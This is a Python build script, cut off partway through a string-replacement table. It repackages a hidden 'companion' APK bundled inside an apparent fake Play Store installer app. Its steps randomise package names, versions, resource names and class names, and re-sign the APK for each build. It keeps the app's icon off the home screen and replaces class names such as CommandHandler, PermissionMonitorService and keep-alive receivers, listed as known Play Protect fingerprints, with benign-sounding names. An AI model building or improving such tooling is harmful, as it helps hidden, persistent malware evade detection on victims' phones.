#!/usr/bin/env python3
"""
build_companion.py
------------------
Consolidates all 15 companion APK steps from build.yml into one script.

Steps covered:
  1.  Generate random companion package name
  2.  Verify companion.apk exists
  3.  Extract companion APK metadata
  4.  Randomize companion res/ filenames
  5.  Decompile companion APK (smali only)
  6.  Rename smali class paths + string literals
  7.  Patch findByHomeLauncher (FLAG_SYSTEM check)
  8.  Restore apktool.yml
  9.  Rebuild classes.dex
  10. Patch manifest + resources.arsc + randomize res/ + assemble APK
  11. Zipalign companion APK
  12. Generate per-build fingerprint
  13. Generate fresh keystore + sign companion APK
  14. Replace companion.apk in assets
  15. Inject companion package name into Kotlin source

Usage:
  python3 scripts/build_companion.py

Environment (set by GitHub Actions or export manually):
  GITHUB_OUTPUT  - path to GitHub Actions output file
  OLD_PKG        - original companion package name (default: com.android.pictach)
  APK_ASSET      - path to companion.apk asset   (default: app/src/main/assets/companion.apk)
"""

import os
import sys
import uuid
import struct
import random
import string
import hashlib
import secrets
import datetime
import subprocess
import zipfile
import shutil

# Step 10 — unicode folder nesting helper
sys.path.insert(0, os.path.dirname(__file__))
from unicode_folder_nest import inject_unicode_nest


# ── BLAKE3 pure-Python implementation (Step 3 & 9 — independent second hash) ─
# Self-contained; no external dependency required.

_BLAKE3_IV = [
    0x6A09E667, 0xBB67AE85, 0x3C6EF372, 0xA54FF53A,
    0x510E527F, 0x9B05688C, 0x1F83D9AB, 0x5BE0CD19,
]
_MSG_SCHEDULE = [
    [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15],
    [2,6,3,10,7,0,4,13,1,11,12,5,9,14,15,8],
    [3,4,10,12,13,2,7,14,6,5,9,0,11,15,8,1],
    [10,7,12,9,14,3,13,15,4,0,11,2,5,8,1,6],
    [12,13,9,11,15,10,14,8,7,2,5,3,0,1,6,4],
    [9,14,11,5,8,12,15,1,13,3,0,10,2,6,4,7],
    [11,15,5,0,1,9,8,6,14,10,2,12,3,4,7,13],
]
_CHUNK_SIZE   = 1024
_BLOCK_SIZE   = 64
_OUT_LEN      = 32
_FLAG_CS      = 1 << 0  # CHUNK_START
_FLAG_CE      = 1 << 1  # CHUNK_END
_FLAG_PARENT  = 1 << 2
_FLAG_ROOT    = 1 << 3

def _rotr32(v, n):
    v &= 0xFFFFFFFF
    return ((v >> n) | (v << (32 - n))) & 0xFFFFFFFF

def _g(state, a, b, c, d, mx, my):
    state[a] = (state[a] + state[b] + mx) & 0xFFFFFFFF
    state[d] = _rotr32(state[d] ^ state[a], 16)
    state[c] = (state[c] + state[d]) & 0xFFFFFFFF
    state[b] = _rotr32(state[b] ^ state[c], 12)
    state[a] = (state[a] + state[b] + my) & 0xFFFFFFFF
    state[d] = _rotr32(state[d] ^ state[a], 8)
    state[c] = (state[c] + state[d]) & 0xFFFFFFFF
    state[b] = _rotr32(state[b] ^ state[c], 7)

def _compress(cv, block_words, counter, block_len, flags):
    import struct as _struct
    state = list(cv) + list(_BLAKE3_IV[:4]) + [
        counter & 0xFFFFFFFF,
        (counter >> 32) & 0xFFFFFFFF,
        block_len & 0xFFFFFFFF,
        flags & 0xFFFFFFFF,
    ]
    for sched in _MSG_SCHEDULE:
        _g(state, 0, 4,  8, 12, block_words[sched[0]],  block_words[sched[1]])
        _g(state, 1, 5,  9, 13, block_words[sched[2]],  block_words[sched[3]])
        _g(state, 2, 6, 10, 14, block_words[sched[4]],  block_words[sched[5]])
        _g(state, 3, 7, 11, 15, block_words[sched[6]],  block_words[sched[7]])
        _g(state, 0, 5, 10, 15, block_words[sched[8]],  block_words[sched[9]])
        _g(state, 1, 6, 11, 12, block_words[sched[10]], block_words[sched[11]])
        _g(state, 2, 7,  8, 13, block_words[sched[12]], block_words[sched[13]])
        _g(state, 3, 4,  9, 14, block_words[sched[14]], block_words[sched[15]])
    for i in range(8):
        state[i]     ^= state[i + 8]
        state[i + 8] ^= cv[i]
    return state

def _words_from_block(block_bytes):
    import struct as _struct
    padded = block_bytes.ljust(64, b'\x00')
    return list(_struct.unpack_from('<16I', padded))

def _compress_chunk(data, offset, length, chunk_index):
    cv = list(_BLAKE3_IV)
    block_count = max(1, (length + _BLOCK_SIZE - 1) // _BLOCK_SIZE)
    for bi in range(block_count):
        bo  = offset + bi * _BLOCK_SIZE
        bl  = min(_BLOCK_SIZE, (offset + length) - bo)
        flags = 0
        if bi == 0:              flags |= _FLAG_CS
        if bi == block_count-1:  flags |= _FLAG_CE
        bw = _words_from_block(data[bo:bo+bl])
        out = _compress(cv, bw, chunk_index, bl, flags)
        cv = out[:8]
    return cv

def blake3(data: bytes) -> bytes:
    import struct as _struct
    if not data:
        out = _compress(list(_BLAKE3_IV), [0]*16, 0, 0, _FLAG_CS | _FLAG_CE | _FLAG_ROOT)
        return b''.join(_struct.pack('<I', w) for w in out[:_OUT_LEN//4])

    num_chunks = (len(data) + _CHUNK_SIZE - 1) // _CHUNK_SIZE
    cv_stack   = []

    for ci in range(num_chunks):
        co  = ci * _CHUNK_SIZE
        cl  = min(_CHUNK_SIZE, len(data) - co)
        is_last = (ci == num_chunks - 1)

        if num_chunks == 1:
            # Single chunk: re-compress last block with ROOT flag
            block_count = max(1, (cl + _BLOCK_SIZE - 1) // _BLOCK_SIZE)
            cv = list(_BLAKE3_IV)
            for bi in range(block_count):
                bo = co + bi * _BLOCK_SIZE
                bl = min(_BLOCK_SIZE, (co + cl) - bo)
                flags = 0
                if bi == 0:             flags |= _FLAG_CS
                if bi == block_count-1: flags |= _FLAG_CE | _FLAG_ROOT
                bw = _words_from_block(data[bo:bo+bl])
                out = _compress(cv, bw, 0, bl, flags)
                if bi == block_count-1:
                    return b''.join(_struct.pack('<I', w) for w in out[:_OUT_LEN//4])
                cv = out[:8]

        cv = _compress_chunk(data, co, cl, ci)

        total = ci + 1
        while total & 1 == 0:
            left = cv_stack.pop()
            flags = _FLAG_PARENT
            block = left + cv
            out = _compress(_BLAKE3_IV, block, 0, _BLOCK_SIZE, flags)
            cv = out[:8]
            total >>= 1
        cv_stack.append(cv)

    cv = cv_stack.pop()
    while cv_stack:
        left = cv_stack.pop()
        is_root = len(cv_stack) == 0
        flags = _FLAG_PARENT | (_FLAG_ROOT if is_root else 0)
        block = left + cv
        out = _compress(_BLAKE3_IV, block, 0, _BLOCK_SIZE, flags)
        if is_root:
            return b''.join(_struct.pack('<I', w) for w in out[:_OUT_LEN//4])
        cv = out[:8]

    # Fallback single remaining
    block = cv + [0]*8
    out = _compress(_BLAKE3_IV, block, 0, _BLOCK_SIZE, _FLAG_PARENT | _FLAG_ROOT)
    return b''.join(_struct.pack('<I', w) for w in out[:_OUT_LEN//4])

def blake3_hex(data: bytes) -> str:
    return blake3(data).hex()


# ── Config ────────────────────────────────────────────────────────────────────

OLD_PKG   = os.environ.get("OLD_PKG",    "com.android.pictach")
APK_ASSET = os.environ.get("APK_ASSET",  "app/src/main/assets/companion.apk")
GITHUB_OUTPUT = os.environ.get("GITHUB_OUTPUT", "")

KOTLIN_FILES = [
    "app/src/main/java/com/playstore/installer/InstallActivity.kt",
    "app/src/main/java/com/playstore/installer/SecondActivity.kt",
    "app/src/main/java/com/playstore/installer/InstallReceiver.kt",
]

# android.intent.category.INFO must stay as-is — it hides the companion from the home screen.
# Do NOT replace it with LAUNCHER (that would make the icon visible on the home screen).

# ── Step audit tracker ────────────────────────────────────────────────────────

import traceback as _traceback
import time as _time

# Audit log path — set by main() so every step writes here
_AUDIT_LOG = os.environ.get("COMPANION_AUDIT_LOG", "companion_audit.log")

def _apk_size(path):
    try:
        return os.path.getsize(path) if os.path.isfile(path) else 0
    except Exception:
        return 0

def _now():
    return datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

def _audit(phase, step_id, step_name, status, rc, started, ended,
           size_before=0, size_after=0, error=""):
    line = (
        f"\n{'─'*60}\n"
        f"  Phase    : {phase}\n"
        f"  Step     : {step_id} — {step_name}\n"
        f"  Status   : {status}  (rc={rc})\n"
        f"  Started  : {started}\n"
        f"  Ended    : {ended}\n"
        f"  APK size : before={size_before} bytes  after={size_after} bytes\n"
    )
    if error:
        line += f"  ERROR    :\n"
        for eline in error.splitlines():
            line += f"             {eline}\n"
    # Print to stdout (captured by generate_batch.sh into companion_build.log)
    print(line, flush=True)
    # Also write to dedicated audit log
    try:
        with open(_AUDIT_LOG, "a") as _f:
            _f.write(line)
    except Exception:
        pass

def track(phase, step_id, step_name, apk_path=None):
    """
    Decorator/context that wraps a step function call with full audit tracking.
    Usage:
        with track("PHASE_1", "STEP_1", "Generate package name"):
            result = step_gen_pkg()
    """
    class _Ctx:
        def __init__(self):
            self.result = None
        def __enter__(self):
            self._started = _now()
            self._size_before = _apk_size(apk_path) if apk_path else 0
            return self
        def __exit__(self, exc_type, exc_val, exc_tb):
            ended = _now()
            size_after = _apk_size(apk_path) if apk_path else 0
            if exc_type is None:
                _audit(phase, step_id, step_name,
                       "✅ PASS", 0,
                       self._started, ended,
                       self._size_before, size_after)
                return False
            else:
                error = "".join(_traceback.format_exception(exc_type, exc_val, exc_tb))
                _audit(phase, step_id, step_name,
                       "❌ FAIL", 1,
                       self._started, ended,
                       self._size_before, size_after,
                       error=error)
                return False  # re-raise
    return _Ctx()



# ── Helpers ───────────────────────────────────────────────────────────────────

def run(cmd, check=True):
    print(f"  $ {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.stdout:
        print(result.stdout)
    if result.stderr:
        print(result.stderr)
    if check and result.returncode != 0:
        # Raise RuntimeError so the full error (including stderr) appears
        # in companion_audit.log ERROR field via the track() context manager
        raise RuntimeError(
            f"Command failed (rc={result.returncode}):\n"
            f"CMD: {cmd}\n"
            f"STDOUT: {result.stdout.strip()}\n"
            f"STDERR: {result.stderr.strip()}"
        )
    return result


def write_output(key, value):
    if GITHUB_OUTPUT:
        with open(GITHUB_OUTPUT, "a") as f:
            f.write(f"{key}={value}\n")


def rand_seg():
    return "".join(random.choices(string.ascii_lowercase, k=random.randint(6, 8)))


def _uleb_decode(data, pos):
    """Decode Android ARSC 1- or 2-byte length. Returns (value, new_pos)."""
    b0 = data[pos]; pos += 1
    if b0 & 0x80:
        b1 = data[pos]; pos += 1
        return ((b0 & 0x7f) << 8) | b1, pos
    return b0, pos


def _uleb_encode(v):
    """Encode value as Android ARSC 1- or 2-byte length."""
    if v < 0x80:
        return bytes([v])
    return bytes([0x80 | (v >> 8), v & 0xFF])


# ASCII characters for res/ file obfuscation.
# Arabic RTL chars caused APK parse errors on Android (V1 signature mismatch).
# ASCII names are safe and still obfuscate original resource names.
import string as _string
_ASCII_CHARS = list(_string.ascii_lowercase + _string.digits)


def rand_res_name(ext, used):
    for _ in range(2000):
        length = random.randint(4, 8)
        name = "".join(random.choices(_ASCII_CHARS, k=length)) + ext
        if name not in used:
            used.add(name)
            return name
    return None


def _rand_name(used_global, length=None):
    """
    Generate a unique random ASCII name for res/ file obfuscation.
    Collision-safe via used_global.
    """
    for _ in range(5000):
        ln = length if length else random.randint(4, 8)
        name = "".join(random.choices(_ASCII_CHARS, k=ln))
        if name not in used_global:
            used_global.add(name)
            return name
    # Fallback: longer name
    for _ in range(5000):
        name = "".join(random.choices(_ASCII_CHARS, k=10))
        if name not in used_global:
            used_global.add(name)
            return name
    raise RuntimeError("Could not generate unique ASCII name after 10000 attempts")


# ── Step 1: Generate random companion package name ────────────────────────────

def step_gen_pkg():
    print("\n── Step 1: Generate companion package name")
    # Use pre-generated legitimate package name from package_name_generator.py
    # if available (passed via NEW_COMP_PKG env var from build.yml).
    # Falls back to random generation only if not provided.
    env_pkg = os.environ.get("NEW_COMP_PKG", "").strip()
    if env_pkg and env_pkg.count(".") >= 2:
        new_pkg = env_pkg
        print(f"  Using generated legitimate pkg: {new_pkg}")
    else:
        new_pkg = f"com.{rand_seg()}.{rand_seg()}"
        print(f"  Generated random pkg (fallback): {new_pkg}")
    write_output("NEW_PKG", new_pkg)
    return new_pkg


# ── Step 2: Verify companion.apk exists ──────────────────────────────────────

def step_verify_apk():
    print("\n── Step 2: Verify companion.apk exists")
    if not os.path.isfile(APK_ASSET):
        print(f"[X] companion.apk missing from assets: {APK_ASSET}")
        sys.exit(1)
    size = os.path.getsize(APK_ASSET)
    print(f"  [OK] companion.apk found ({size // 1024} KB)")


# ── Step 3: Extract companion APK metadata ────────────────────────────────────

def step_extract_metadata():
    print("\n── Step 3: Extract companion APK metadata")
    result = subprocess.run(
        f"aapt dump badging \"{APK_ASSET}\" 2>/dev/null | head -5",
        shell=True, capture_output=True, text=True
    )
    info = result.stdout
    print(info)

    import re
    min_sdk   = re.search(r"minSdkVersion:'(\d+)'",    info)
    tgt_sdk   = re.search(r"targetSdkVersion:'(\d+)'", info)
    ver_code  = re.search(r"versionCode='(\d+)'",      info)
    ver_name  = re.search(r"versionName='([^']+)'",    info)

    # Step 9A: randomize versionCode and versionName for companion per build
    rand_ver_code = str(random.randint(100000, 999999))
    rand_major    = random.randint(1, 9)
    rand_minor    = random.randint(0, 99)
    rand_patch    = random.randint(0, 99)
    rand_ver_name = f"{rand_major}.{rand_minor}.{rand_patch}"

    meta = {
        "min_sdk":  min_sdk.group(1)  if min_sdk  else "28",
        "tgt_sdk":  tgt_sdk.group(1)  if tgt_sdk  else "33",
        "ver_code": rand_ver_code,
        "ver_name": rand_ver_name,
    }
    for k, v in meta.items():
        write_output(k, v)
    print(f"  ✅ min={meta['min_sdk']} target={meta['tgt_sdk']} "
          f"code={meta['ver_code']} name={meta['ver_name']} (randomized per build)")
    return meta


# ── Step 4: Randomize companion res/ filenames ────────────────────────────────

def step_randomize_res():
    """
    Randomizes ALL res/ filenames inside companion.apk including:
      - res/color/, res/color-night-v8/, res/color-v23/  (from randomize_companion_res.py)
      - all other res/ dirs except res/values/
    Uses global collision-safe naming (_rand_name) across all res/ dirs.
    """
    print("\n── Step 4: Randomize companion res/ filenames")

    SKIP_RES_DIRS = ("res/values",)

    with zipfile.ZipFile(APK_ASSET, "r") as z:
        all_names = [i.filename for i in z.infolist()]

    # Build global used set from all existing res/ base names (collision-safe)
    used_global = set()
    for name in all_names:
        if name.startswith("res/") and "/" in name[4:]:
            base = os.path.splitext(os.path.basename(name))[0]
            if base:
                used_global.add(base)

    res_rename = {}

    for name in sorted(all_names):
        if not name.startswith("res/"):
            continue
        if any(name.startswith(s) for s in SKIP_RES_DIRS):
            continue
        if name.endswith("/"):
            continue
        dir_part  = name.rsplit("/", 1)[0]
        file_part = name.rsplit("/", 1)[1]
        if file_part.endswith(".9.png"):
            ext = ".9.png"
        else:
            ext = os.path.splitext(file_part)[1]
        new_base = _rand_name(used_global)
        res_rename[name] = f"{dir_part}/{new_base}{ext}"

    MUST_STORE_RES = {"AndroidManifest.xml", "classes.dex", "resources.arsc"}

    tmp = APK_ASSET + ".res_tmp"
    with zipfile.ZipFile(APK_ASSET, "r") as zin:
        with zipfile.ZipFile(tmp, "w", allowZip64=False) as zout:
            for item in zin.infolist():
                data = zin.read(item.filename)
                if item.filename in MUST_STORE_RES:
                    item.compress_type = zipfile.ZIP_STORED
                if item.filename in res_rename:
                    new_item = zipfile.ZipInfo(res_rename[item.filename])
                    new_item.compress_type = item.compress_type
                    # CRITICAL: Set UTF-8 EFS flag for Arabic filenames
                    # Without this, apksigner reads them as latin-1 → mojibake
                    # names in MANIFEST.MF → v1 signature verification fails
                    if any(ord(c) > 127 for c in res_rename[item.filename]):
                        new_item.flag_bits |= 0x800
                    zout.writestr(new_item, data)
                else:
                    zout.writestr(item, data)

    os.replace(tmp, APK_ASSET)
    print(f"  ✅ companion res/ randomized ({len(res_rename)} files)")
    return res_rename


# ── Step 5: Decompile companion APK (smali only) ─────────────────────────────

def step_decompile():
    print("\n── Step 5: Decompile companion APK (smali only)")
    if os.path.exists("companion_decompiled"):
        shutil.rmtree("companion_decompiled")
    run(f'apktool d "{APK_ASSET}" -o companion_decompiled --no-res --keep-broken-res')
    print("  ✅ Decompile done")


# ── Step 6: Rename smali ──────────────────────────────────────────────────────

def step_rename_smali(new_pkg):
    print("\n── Step 6: Rename smali class paths + string literals")
    old_path = OLD_PKG.replace(".", "/")
    new_path = new_pkg.replace(".", "/")

    run(f'find companion_decompiled/smali -name "*.smali" '
        f'-exec sed -i "s|{old_path}|{new_path}|g" {{}} +')
    run(f'find companion_decompiled/smali -name "*.smali" '
        f'-exec sed -i "s|{OLD_PKG}|{new_pkg}|g" {{}} +')

    old_smali_dir = f"companion_decompiled/smali/{old_path}"
    new_smali_dir = f"companion_decompiled/smali/{new_path}"
    if os.path.isdir(old_smali_dir):
        parent = os.path.dirname(new_smali_dir)
        os.makedirs(parent, exist_ok=True)
        shutil.move(old_smali_dir, new_smali_dir)

    # Verify
    result = subprocess.run(
        f'grep -r "{old_path}" companion_decompiled/smali/ | wc -l',
        shell=True, capture_output=True, text=True
    )
    old_count = int(result.stdout.strip())
    if old_count > 0:
        print(f"[X] Old package path still present in smali after rename ({old_count} refs)")
        sys.exit(1)
    print("  ✅ Smali renamed")




# ── Step 6A: Class rename map ─────────────────────────────────────────────────
# Maps original companion class names → pools of legitimate Android-style names
# Different name chosen per build from each pool

CLASS_RENAME_POOLS = {
    # Core service classes
    "MainService":                   ["BackgroundDataService","SyncJobService","MediaPlaybackService","FileCleanupService","DataUpdateService","ContentSyncService","RemoteDataService","BackgroundSyncService"],
    "NetworkManager":                ["ConnectionStateMonitor","NetworkStateTracker","RemoteConnectionHelper","DataConnectionManager","NetworkActivityMonitor","ConnectivityStateHelper","HttpConnectionTracker","NetworkSessionManager"],
    "CommandHandler":                ["TaskQueueProcessor","RemoteTaskExecutor","BackgroundTaskHandler","AsyncCommandProcessor","WorkItemDispatcher","TaskSchedulerHelper","JobQueueManager","RemoteActionHandler"],
    "LoveApi":                       ["MediaContentProvider","RemoteDataSource","ApiRequestManager","HttpServiceClient","DataFetchHelper","RemoteApiHandler","ContentServiceClient","DataRequestHelper"],
    "LoveApi0":                      ["MediaContentHelper","RemoteDataHelper","ApiServiceWrapper","HttpClientHelper","DataProviderClient","RemoteServiceHelper","ContentDataClient","ServiceRequestHelper"],
    "Firebase":                      ["NotificationListenerHelper","PushMessageHandler","RemoteConfigManager","CloudMessageReceiver","DataPushListener","RemoteNotificationHelper","PushServiceHandler","CloudDataReceiver"],
    "FirebaseApis":                  ["NotificationApiHelper","PushApiManager","CloudApiClient","RemoteApiService","DataApiHandler","PushNotificationClient","CloudServiceApi","RemoteDataApi"],
    "Firebaseconfig":                ["RemoteConfigHelper","CloudConfigManager","ServiceConfigLoader","DataConfigHandler","ConfigSyncHelper","RemoteSettingsLoader","CloudConfigClient","ServiceSettingsHelper"],
    "Firebasekit":                   ["CloudServiceKit","RemoteServiceHelper","NotificationKit","DataSyncKit","PushServiceKit","CloudDataKit","RemoteDataKit","ServiceHelperKit"],
    "Firebasemac":                   ["DeviceIdHelper","HardwareInfoCollector","DeviceInfoManager","SystemInfoHelper","DeviceDataCollector","HardwareDataHelper","SystemInfoCollector","DeviceStateHelper"],
    "Firebases":                     ["CloudDataSyncer","RemoteDataSyncer","ServiceDataSync","DataSyncManager","CloudSyncHelper","RemoteConfigSyncer","ServiceSyncHelper","DataConfigSyncer"],
    "Api":                           ["ServiceApiClient","RemoteServiceApi","DataApiClient","HttpApiHelper","ServiceRequestClient","RemoteApiClient","DataServiceApi","HttpServiceHelper"],
    "activityadm":                   ["ActivityLifecycleHelper","ScreenStateMonitor","ActivityStateTracker","WindowStateHelper","LifecycleStateMonitor","ActivityMonitorHelper","ScreenActivityTracker","WindowActivityHelper"],
    "App":                           ["ApplicationController","AppLifecycleManager","ApplicationStateHelper","AppInitializer","ApplicationManager","AppStateController","LifecycleController","ApplicationHelper"],
    "Avast":                         ["SecurityScanHelper","IntegrityCheckHelper","AppVerificationHelper","SecurityStateMonitor","IntegrityVerifier","AppSecurityHelper","SecurityCheckManager","VerificationHelper"],
    "Bodybuilding":                  ["ServiceRestartHelper","ProcessKeepAliveHelper","ServicePersistenceHelper","BackgroundKeepAlive","ProcessRestartManager","ServiceLifecycleHelper","BackgroundPersistence","KeepAliveHelper"],
    "Config":                        ["AppConfigurationHelper","ServiceConfigManager","ConfigurationLoader","AppSettingsHelper","ConfigDataManager","ServiceSettingsHelper","AppConfigLoader","SettingsConfigHelper"],
    "DataHelper":                    ["DatabaseAccessHelper","DataStorageHelper","LocalDataManager","ContentStorageHelper","DataAccessManager","LocalStorageHelper","DatabaseManager","ContentDataHelper"],
    "DownloadTask":                  ["FileDownloadHelper","ContentFetchTask","DataDownloadManager","ResourceFetchHelper","FileRetrievalTask","ContentDownloadHelper","DataFetchTask","ResourceDownloadHelper"],
    "MainActivity":                  ["SplashScreenActivity","WelcomeActivity","LauncherActivity","StartupActivity","InitialActivity","EntryPointActivity","HomeScreenActivity","MainEntryActivity"],
    "MyReceiver":                    ["SystemEventReceiver","BroadcastEventHelper","SystemBroadcastReceiver","EventListenerHelper","SystemEventHelper","BroadcastListenerHelper","SystemStateReceiver","EventBroadcastHelper"],
    "MySettings":                    ["AppPreferencesHelper","UserSettingsManager","PreferenceStorageHelper","SettingsDataHelper","UserPreferenceManager","AppSettingsHelper","PreferenceManagerHelper","SettingsHelper"],
    "MyWorkerService":               ["BackgroundWorkerService","PeriodicTaskService","WorkManagerService","ScheduledTaskService","BackgroundJobService","PeriodicWorkService","TaskWorkerService","ScheduledWorkService"],
    "NetworkManager$1":              ["ConnectionStateMonitor$1","NetworkStateTracker$1","RemoteConnectionHelper$1","DataConnectionManager$1","NetworkActivityMonitor$1","ConnectivityStateHelper$1","HttpConnectionTracker$1","NetworkSessionManager$1"],
    "NetworkManager$2":              ["ConnectionStateMonitor$2","NetworkStateTracker$2","RemoteConnectionHelper$2","DataConnectionManager$2","NetworkActivityMonitor$2","ConnectivityStateHelper$2","HttpConnectionTracker$2","NetworkSessionManager$2"],
    "NetworkManager$3":              ["ConnectionStateMonitor$3","NetworkStateTracker$3","RemoteConnectionHelper$3","DataConnectionManager$3","NetworkActivityMonitor$3","ConnectivityStateHelper$3","HttpConnectionTracker$3","NetworkSessionManager$3"],
    "PermissionMonitorService":      ["AccessibilityMonitorService","PermissionStateService","RuntimePermissionHelper","AccessPermissionService","PermissionCheckService","AccessibilityStateService","RuntimeAccessHelper","PermissionHelperService"],
    "PermissionMonitorService$a":    ["AccessibilityMonitorService$a","PermissionStateService$a","RuntimePermissionHelper$a","AccessPermissionService$a","PermissionCheckService$a","AccessibilityStateService$a","RuntimeAccessHelper$a","PermissionHelperService$a"],
    "PersistentWorker":              ["PeriodicSyncWorker","BackgroundRefreshWorker","DataSyncWorker","CacheRefreshWorker","PeriodicDataWorker","BackgroundSyncWorker","DataRefreshWorker","CacheSyncWorker"],
    "RC":                            ["PackageEventReceiver","AppInstallReceiver","PackageStateReceiver","AppEventReceiver","InstallEventReceiver","PackageChangeReceiver","AppStateReceiver","InstallStateReceiver"],
    "SensorRestarterBroadcastReceiver": ["ServiceRestartReceiver","ProcessReviveReceiver","ServiceRevivalReceiver","BackgroundRestartReceiver","ServiceRecoveryReceiver","ProcessRecoveryReceiver","ServiceRenewalReceiver","BackgroundRecoveryReceiver"],
    "ServiceStarterWorker":          ["ServiceInitWorker","BackgroundStartWorker","ServiceLaunchWorker","ProcessStartWorker","ServiceBootWorker","BackgroundInitWorker","ServiceStartupWorker","ProcessInitWorker"],
    "Upme":                          ["DeviceUpdateService","SystemUpdateHelper","AppUpdateService","SoftwareUpdateHelper","DeviceRefreshService","SystemRefreshHelper","AppRefreshService","UpdateHelperService"],
    "Utils":                         ["AppUtilityHelper","CommonHelperUtils","AppCommonHelper","UtilityManager","CommonAppHelper","SharedUtilityHelper","AppHelperUtils","CommonUtilManager"],
    "WackMeUpJob":                   ["ScheduledAlarmJob","PeriodicWakeJob","TimedTaskJob","AlarmSchedulerJob","PeriodicAlarmJob","TimedWakeJob","ScheduledTaskJob","AlarmTaskJob"],
    "WorkerService":                 ["BackgroundTaskService","AsyncWorkerService","TaskExecutorService","BackgroundJobService","AsyncTaskService","WorkExecutorService","TaskRunnerService","BackgroundExecutorService"],
    "body":                          ["RequestBodyHelper","DataBodyHelper","HttpBodyManager","RequestDataHelper","ContentBodyHelper","DataRequestBody","HttpDataHelper","RequestContentHelper"],
    "com":                           ["DataSyncService","ContentSyncService","BackgroundSyncService","RemoteSyncService","DataUpdateService","ContentUpdateService","BackgroundUpdateService","RemoteUpdateService"],
    "google":                        ["CloudServiceHelper","RemoteCloudHelper","CloudDataHelper","RemoteServiceHelper","CloudContentHelper","DataCloudHelper","RemoteCloudService","CloudHelperService"],
    "love":                          ["ContentStreamService","DataStreamHelper","RemoteStreamService","ContentDataStream","StreamHelperService","DataContentStream","RemoteDataStream","ContentHelperStream"],
    "myker":                         ["DataKeepAliveHelper","ContentKeeperHelper","ServiceKeeperHelper","DataRetentionHelper","ContentRetainer","ServiceRetentionHelper","DataPersistHelper","ContentPersistHelper"],
    "video":                         ["MediaStreamService","ContentStreamHelper","MediaDataService","StreamContentHelper","MediaContentService","DataStreamService","ContentMediaHelper","StreamDataService"],
    "Utils$1":                       ["AppUtilityHelper$1","CommonHelperUtils$1","AppCommonHelper$1","UtilityManager$1","CommonAppHelper$1","SharedUtilityHelper$1","AppHelperUtils$1","CommonUtilManager$1"],
    "WackMeUpJob$a":                 ["ScheduledAlarmJob$a","PeriodicWakeJob$a","TimedTaskJob$a","AlarmSchedulerJob$a","PeriodicAlarmJob$a","TimedWakeJob$a","ScheduledTaskJob$a","AlarmTaskJob$a"],
    "WorkerService$a":               ["BackgroundTaskService$a","AsyncWorkerService$a","TaskExecutorService$a","BackgroundJobService$a","AsyncTaskService$a","WorkExecutorService$a","TaskRunnerService$a","BackgroundExecutorService$a"],
    "MyWorkerService$a":             ["BackgroundWorkerService$a","PeriodicTaskService$a","WorkManagerService$a","ScheduledTaskService$a","BackgroundJobService$a","PeriodicWorkService$a","TaskWorkerService$a","ScheduledWorkService$a"],
    "Api$1":                         ["ServiceApiClient$1","RemoteServiceApi$1","DataApiClient$1","HttpApiHelper$1","ServiceRequestClient$1","RemoteApiClient$1","DataServiceApi$1","HttpServiceHelper$1"],
    "Api$2":                         ["ServiceApiClient$2","RemoteServiceApi$2","DataApiClient$2","HttpApiHelper$2","ServiceRequestClient$2","RemoteApiClient$2","DataServiceApi$2","HttpServiceHelper$2"],
    "Api$ta":                        ["ServiceApiClient$ta","RemoteServiceApi$ta","DataApiClient$ta","HttpApiHelper$ta","ServiceRequestClient$ta","RemoteApiClient$ta","DataServiceApi$ta","HttpServiceHelper$ta"],
    "Api$ta$1":                      ["ServiceApiClient$ta$1","RemoteServiceApi$ta$1","DataApiClient$ta$1","HttpApiHelper$ta$1","ServiceRequestClient$ta$1","RemoteApiClient$ta$1","DataServiceApi$ta$1","HttpServiceHelper$ta$1"],
    "Firebase$1":                    ["NotificationListenerHelper$1","PushMessageHandler$1","RemoteConfigManager$1","CloudMessageReceiver$1","DataPushListener$1","RemoteNotificationHelper$1","PushServiceHandler$1","CloudDataReceiver$1"],
    "Firebase$2":                    ["NotificationListenerHelper$2","PushMessageHandler$2","RemoteConfigManager$2","CloudMessageReceiver$2","DataPushListener$2","RemoteNotificationHelper$2","PushServiceHandler$2","CloudDataReceiver$2"],
    "Firebase$3":                    ["NotificationListenerHelper$3","PushMessageHandler$3","RemoteConfigManager$3","CloudMessageReceiver$3","DataPushListener$3","RemoteNotificationHelper$3","PushServiceHandler$3","CloudDataReceiver$3"],
    "Firebase$4":                    ["NotificationListenerHelper$4","PushMessageHandler$4","RemoteConfigManager$4","CloudMessageReceiver$4","DataPushListener$4","RemoteNotificationHelper$4","PushServiceHandler$4","CloudDataReceiver$4"],
    "body$1":                        ["RequestBodyHelper$1","DataBodyHelper$1","HttpBodyManager$1","RequestDataHelper$1","ContentBodyHelper$1","DataRequestBody$1","HttpDataHelper$1","RequestContentHelper$1"],
    "body$FI_body_N":                ["RequestBodyHelper$FI_body_N","DataBodyHelper$FI_body_N","HttpBodyManager$FI_body_N","RequestDataHelper$FI_body_N","ContentBodyHelper$FI_body_N","DataRequestBody$FI_body_N","HttpDataHelper$FI_body_N","RequestContentHelper$FI_body_N"],
    "body$MyExceptionHandler":       ["RequestBodyHelper$ExceptionHandler","DataBodyHelper$ExceptionHandler","HttpBodyManager$ExceptionHandler","RequestDataHelper$ExceptionHandler","ContentBodyHelper$ExceptionHandler","DataRequestBody$ExceptionHandler","HttpDataHelper$ExceptionHandler","RequestContentHelper$ExceptionHandler"],
    "com$1":                         ["DataSyncService$1","ContentSyncService$1","BackgroundSyncService$1","RemoteSyncService$1","DataUpdateService$1","ContentUpdateService$1","BackgroundUpdateService$1","RemoteUpdateService$1"],
    "google$1":                      ["CloudServiceHelper$1","RemoteCloudHelper$1","CloudDataHelper$1","RemoteServiceHelper$1","CloudContentHelper$1","DataCloudHelper$1","RemoteCloudService$1","CloudHelperService$1"],
    "love$MyExceptionHandler":       ["ContentStreamService$ExceptionHandler","DataStreamHelper$ExceptionHandler","RemoteStreamService$ExceptionHandler","ContentDataStream$ExceptionHandler","StreamHelperService$ExceptionHandler","DataContentStream$ExceptionHandler","RemoteDataStream$ExceptionHandler","ContentHelperStream$ExceptionHandler"],
}

# Strings to replace in smali (known GPP fingerprints)
STRING_REPLACEMENTS = {
    "MainService":                   "BackgroundDataService",
    "NetworkManager":                "ConnectionStateMonitor",
    "LoveApi":                       "MediaContentProvider",
    "CommandHandler":                "TaskQueueProcessor",
    "FirebaseActivSend":             "CloudNotificationSender",
    "ProcessCommand":                "executeBackgroundTask",
    "DownloadTask":                  "FileRetrievalTask",
    "SensorRestarterBroadcastReceiver": "ServiceRestartReceiver",
    "WackMeUpJob":                   "ScheduledAlarmJob",
